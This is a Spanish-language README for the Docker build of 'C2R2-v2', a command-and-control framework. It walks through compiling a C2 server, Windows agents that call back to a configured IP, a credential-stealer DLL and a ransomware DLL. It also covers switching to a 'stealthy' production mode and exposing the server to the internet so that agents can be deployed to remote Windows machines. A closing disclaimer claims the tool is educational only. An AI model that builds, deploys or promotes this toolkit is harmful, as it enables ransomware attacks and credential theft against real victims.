# 🐳 Docker Build - C2R2-v2

Este directorio contiene la configuración de Docker para compilar todos los componentes de C2R2-v2 de forma automática.

## ⚡ TL;DR - Compilación Rápida

```bash
# 1. Configurar (opcional, usa valores por defecto si se omite)
cp .env.example .env
nano .env  # Configura SERVER_IP y SERVER_PORT

# 2. Compilar TODO con un solo comando
docker-compose up --build

# 3. Tus binarios están en dist/
ls dist/
```

¡Eso es todo! Todos los binarios (servidor, agente, builder, DLLs) están listos en `dist/`.

---

## 📦 ¿Qué compila?

El sistema de Docker compila y entrega:

- ✅ **Servidor C2** (`c2r2-server`) - Binario Linux listo para ejecutar
- ✅ **Agente Windows** (`agent.exe`) - Con IP/puerto preconfigurado
- ✅ **Builder** - Herramienta para generar más agentes
- ✅ **Stealer DLL** - Módulo de robo de credenciales (encriptado)
- ✅ **Ransomware DLL** - Módulo de ransomware (encriptado)
- ✅ **Módulos encriptados** - Listos para cargar en el agente

## 🚀 Uso Rápido

### 1. Configurar parámetros

Copia el archivo de ejemplo y edítalo:

```bash
cp .env.example .env
nano .env
```

Configura los valores:
```bash
# IP donde se conectará el agente (tu IP pública o local)
SERVER_IP=192.168.1.10

# Puerto del servidor
SERVER_PORT=4444

# Nombre del agente
AGENT_NAME=agent

# Modo: false = desarrollo (debug), true = producción (stealthy)
PRODUCTION_MODE=false
```

### 2. Compilar todo

```bash
docker-compose up --build
```

O si ya tienes la imagen:
```bash
docker-compose up
```

### 3. Obtener los binarios

Todos los binarios compilados estarán en el directorio `dist/`:

```bash
ls -lh dist/
```

Verás:
```
dist/
├── c2r2-server          # Servidor C2 (Linux)
├── agent.exe            # Agente Windows
├── builder              # Builder (Linux)
├── stealer.dll          # DLL stealer
├── ransomware.dll       # DLL ransomware
├── modules/             # Módulos encriptados
│   ├── stealer.enc
│   └── ransomware.enc
└── BUILD_INFO.txt       # Información de compilación
```

## 🔧 Opciones Avanzadas

### Compilar con parámetros personalizados

Puedes sobrescribir las variables sin modificar `.env`:

```bash
# Agente de desarrollo para red local
SERVER_IP=192.168.1.10 SERVER_PORT=4444 AGENT_NAME=agent-dev PRODUCTION_MODE=false docker-compose up --build

# Agente de producción para Internet
SERVER_IP=203.0.113.50 SERVER_PORT=8080 AGENT_NAME=agent-prod PRODUCTION_MODE=true docker-compose up --build
```

### Compilar múltiples agentes

Para diferentes configuraciones:

```bash
# Agente 1: Red local
SERVER_IP=192.168.1.10 AGENT_NAME=agent-lan docker-compose up --build

# Agente 2: Internet
SERVER_IP=203.0.113.50 AGENT_NAME=agent-wan docker-compose up --build

# Agente 3: Producción stealthy
SERVER_IP=203.0.113.50 AGENT_NAME=agent-stealth PRODUCTION_MODE=true docker-compose up --build
```

### Solo reconstruir la imagen

```bash
docker-compose build
```

### Limpiar todo

```bash
docker-compose down
docker rmi c2r2-builder:latest
rm -rf dist/
```

## 📋 Modos de Compilación

### Modo Desarrollo (`PRODUCTION_MODE=false`)

- ✅ Consola visible para debugging
- ✅ Prints de debug habilitados
- ✅ Ideal para testing y desarrollo
- ⚠️ NO usar en operaciones reales

```bash
PRODUCTION_MODE=false docker-compose up --build
```

### Modo Producción (`PRODUCTION_MODE=true`)

- ✅ Sin consola (100% stealthy)
- ✅ Sin prints de debug
- ✅ Totalmente silencioso
- ✅ Listo para operaciones reales

```bash
PRODUCTION_MODE=true docker-compose up --build
```

## 🎯 Ejemplos de Uso

### Ejemplo 1: Testing Local

```bash
# Configuración en .env
SERVER_IP=127.0.0.1
SERVER_PORT=4444
AGENT_NAME=agent-test
PRODUCTION_MODE=false

# Compilar
docker-compose up --build

# Usar
cd dist
./c2r2-server --bind 0.0.0.0 --port 4444
# En Windows: ejecutar agent-test.exe
```

### Ejemplo 2: Red Local (LAN)

```bash
# Configuración en .env
SERVER_IP=192.168.1.100
SERVER_PORT=4444
AGENT_NAME=agent-lan
PRODUCTION_MODE=false

# Compilar
docker-compose up --build

# Desplegar
cd dist
./c2r2-server --bind 0.0.0.0 --port 4444
# Transferir agent-lan.exe a máquina Windows en la LAN
```

### Ejemplo 3: Internet con Port Forwarding

```bash
# Configuración en .env (usa tu IP pública)
SERVER_IP=203.0.113.50
SERVER_PORT=4444
AGENT_NAME=agent-internet
PRODUCTION_MODE=true

# Compilar
docker-compose up --build

# Configurar router
# 1. Port forwarding: 4444 externo → 4444 interno
# 2. Abrir firewall: sudo ufw allow 4444/tcp

# Desplegar
cd dist
./c2r2-server --bind 0.0.0.0 --port 4444
# Transferir agent-internet.exe a máquina Windows remota
```

### Ejemplo 4: Raspberry Pi

```bash
# Configuración en .env (IP pública de tu casa)
SERVER_IP=203.0.113.50
SERVER_PORT=8080
AGENT_NAME=agent-rpi
PRODUCTION_MODE=true

# Compilar
docker-compose up --build

# En Raspberry Pi
cd dist
./c2r2-server --bind 0.0.0.0 --port 8080
```

## 🔍 Verificación

Después de compilar, verifica los binarios:

```bash
# Ver información de compilación
cat dist/BUILD_INFO.txt

# Verificar servidor
file dist/c2r2-server
dist/c2r2-server --version

# Verificar agente
file dist/agent.exe

# Verificar DLLs
file dist/stealer.dll
file dist/ransomware.dll

# Verificar módulos encriptados
ls -lh dist/modules/
```

## 🐛 Troubleshooting

### Error: "Cannot connect to Docker daemon"

```bash
# Iniciar Docker
sudo systemctl start docker

# Agregar usuario a grupo docker
sudo usermod -aG docker $USER
newgrp docker
```

### Error: "Permission denied" en dist/

```bash
# Corregir permisos
sudo chown -R $USER:$USER dist/
```

### Binarios no aparecen en dist/

```bash
# Limpiar y reconstruir
docker-compose down
rm -rf dist/
docker-compose up --build
```

### Agente no se conecta

1. Verifica la IP configurada:
   ```bash
   grep SERVER_IP .env
   ```

2. Verifica que el servidor esté escuchando:
   ```bash
   netstat -tlnp | grep 4444
   ```

3. Verifica firewall:
   ```bash
   sudo ufw status
   sudo ufw allow 4444/tcp
   ```

## 📚 Más Información

- **[README Principal](README.md)** - Documentación general
- **[BUILD.md](BUILD.md)** - Modos de compilación
- **[Raspberry Pi Setup](RASPBERRY_PI_SETUP.md)** - Configuración para Pi
- **[Network Deployment](docs/NETWORK_DEPLOYMENT.md)** - Despliegue en red

## ⚠️ Advertencia Legal

**SOLO PARA PROPÓSITOS EDUCATIVOS Y TESTING AUTORIZADO**

El uso no autorizado de este software es ilegal. Usa solo en sistemas que posees o tienes autorización explícita para testear.

---

**🐳 Happy Hacking!**
